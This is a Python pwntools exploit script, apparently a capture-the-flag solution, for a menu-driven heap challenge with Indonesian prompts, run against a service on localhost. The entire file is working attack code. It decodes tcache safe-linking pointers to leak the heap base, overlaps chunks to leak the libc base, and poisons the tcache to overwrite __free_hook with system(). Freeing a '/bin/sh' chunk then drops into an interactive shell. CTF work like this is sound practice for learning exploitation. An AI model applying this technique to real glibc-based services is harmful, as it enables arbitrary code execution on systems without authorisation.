from pwn import *

# p = process(["../src/chall"])
elf = ELF("../dist/chall")
libc = ELF("../dist/libc.so.6")
p = remote("127.0.0.1",32783)
# context.log_level = 'debug'

def alloc(len,inp):
    p.sendlineafter(b"Keluar\n", b"1")
    p.sendlineafter(b"> ",str(len).encode())
    p.sendlineafter(b"> ", inp)

def free():
    p.sendlineafter(b"Keluar\n", b"2")

def alloc_free(len):
    p.sendlineafter(b"Keluar\n", b"1")
    p.sendlineafter(b"> ", str(len).encode())
    p.sendlineafter(b"> ", b"X"*8)
    p.sendlineafter(b"Keluar\n", b"2")

def show():
    p.sendlineafter(b"Keluar\n", b"3")

def defuscate(x,l=64):
    p = 0
    for i in range(l*4,0,-4): # 16 nibble
        v1 = (x & (0xf << i )) >> i
        v2 = (p & (0xf << i+12 )) >> i+12
        p |= (v1 ^ v2) << i
    return p

# def obfuscate(heapbase,target):
# 	return (heapbase >> 0xc) ^ target

def obfuscate(p, adr):
    return p^(adr>>12)

# Prepare To leak heapbase
alloc_free(24)

# Set tcache 0x30
alloc_free(48)
alloc_free(32)

# Change 0x40 to 0x30
alloc(24,b"A"*24+p64(0x31))
free()

# 0x40 now become tcache 0x30
alloc_free(48)

# To leak heapbase
alloc(24,b"A"*31)

show()

p.recvuntil(b"AAAAAAA\n")

heap_base = defuscate(((u64((p.recvuntil(b"\n", drop=True).ljust(8,b"\x00")))))) ^ 0x300

## setup small bins to leak libc base
# set bins 0x90 - 0x100
for i in range(138, 272, 8):
    alloc_free(i)

# change to size 0x90
count = 17

for i in range(264, 138, -16):
    alloc(i,(p64(0x90)+p64(0x91))*count)
    count -= 1
    free()

for i in range(272, 138, -8):
    alloc_free(i)

alloc(24,b"A"*7)

show()

p.recvuntil(b"AAAAAAA\n")

leak_libc = (u64((p.recvuntil(b"\n", drop=True).ljust(8,b"\x00")))) 
libc.address = leak_libc - 0x1e0c80

free_hook = libc.symbols['__free_hook']
systems = libc.symbols['system']

log.info(f"Leak libc\t : {hex(leak_libc)}")
log.info(f"Heap base\t : {hex(heap_base)}")
log.info(f"Libc base\t : {hex(libc.address)}")
log.info(f"free_hook\t : {hex(free_hook)}")
log.info(f"System\t\t: {hex(systems)}")

# Clean unsorted bins
alloc_free(0x68) # 0x70

# Prepare to edit fd
alloc_free(0x128) # 0x130
alloc_free(0x48) # 0x50

# Target to be edited fd to free_hook
alloc_free(0x58) # 0x60
alloc_free(0x78) # 0x80

# Change chunk 0x50 -> 0x80
alloc(0x128,b"A"*0x128+p64(0x131))
free()
alloc_free(0x48)

# Change chunk 0x80 -> 0x60
alloc(0x58,b"A"*0x58+p64(0x61))
free()
alloc_free(0x78)

# Set fd 0x60 to free_hook
alloc(0x128,b"A"*0xa8+p64(0x21)+p64(obfuscate(free_hook,heap_base+0x1310))) # fd = free_hook
free()

# To make free_hook on 1st tcache
alloc_free(0x58)

# Set free_hook to system()
alloc(0x58,p64(systems))
free()

# Set binsh
alloc(0x138,b"/bin/sh\x00")
free()

# gdb.attach(p,gdbscript="""
# init-pwndbg
# set max-visualize-chunk-size 0x500
# """)

p.interactive()